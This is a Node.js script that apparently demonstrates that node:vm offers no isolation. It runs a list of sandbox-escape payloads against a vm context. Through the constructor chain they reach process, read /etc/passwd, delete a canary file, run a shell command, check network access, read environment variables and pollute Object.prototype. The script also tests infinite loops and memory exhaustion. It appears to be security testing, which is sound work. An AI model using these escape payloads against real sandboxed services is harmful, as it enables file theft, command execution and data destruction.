// The same attacks against node:vm (what chat-grown-software's prototype uses), run from a host with a canary.
import vm from "node:vm";
import { spawnSync } from "node:child_process";
import { writeFileSync, readFileSync, existsSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
const dir = mkdtempSync(join(tmpdir(), "vm-showcase-"));
const canary = join(dir, "canary.txt");
writeFileSync(canary, "CANARY-UNTOUCHED");
const hostState = { expenses: [] };
const attacks = {
  "read /etc/passwd": `this.constructor.constructor("return process")().getBuiltinModule("fs").readFileSync("/etc/passwd","utf8").split("\\n")[0]`,
  "delete the canary file": `this.constructor.constructor("return process")().getBuiltinModule("fs").unlinkSync(${JSON.stringify(canary)}); "deleted"`,
  "spawn a shell": `this.constructor.constructor("return process")().getBuiltinModule("child_process").execSync("id").toString().trim()`,
  "open a socket (net.connect function reachable)": `typeof this.constructor.constructor("return process")().getBuiltinModule("net").connect`,
  "read environment (HOME)": `this.constructor.constructor("return process")().env.HOME`,
  "patch a host builtin through a state object passed in": `state.constructor.prototype.polluted = "yes"; "patched Object.prototype"`,
  "loop forever (vm timeout option set to 200ms)": `while (true) {}`,
};
for (const [name, code] of Object.entries(attacks)) {
  const ctx = vm.createContext({ state: hostState });
  try {
    const r = vm.runInContext(code, ctx, { timeout: 200 });
    console.log(`${name}\n   node:vm -> SUCCEEDED: ${String(r).slice(0, 60)}`);
  } catch (e) {
    console.log(`${name}\n   node:vm -> stopped: ${String(e.message).slice(0, 60)}`);
  }
}
console.log(`\nhost after attacks: canary exists = ${existsSync(canary)}; ({}).polluted = ${JSON.stringify(({}).polluted)}`);
// memory: a vm context shares the host heap; run in a child so the demo survives
const child = spawnSync(process.execPath, ["--max-old-space-size=64", "-e",
  `const vm=require("node:vm"); try { vm.runInNewContext("var a=[]; while(true) a.push(new Array(1e5).fill(1))", {}, {timeout:5000}); } catch(e){ console.log("caught", e.message) } console.log("host still alive")`],
  { encoding: "utf8", timeout: 20000 });
console.log(`allocate without bound (host heap capped at 64 MB for the demo)\n   node:vm -> host process exit code ${child.status}, signal ${child.signal}; stdout=${JSON.stringify(child.stdout.trim())}; stderr mentions OOM=${/heap out of memory|Allocation failed/i.test(child.stderr)}`);
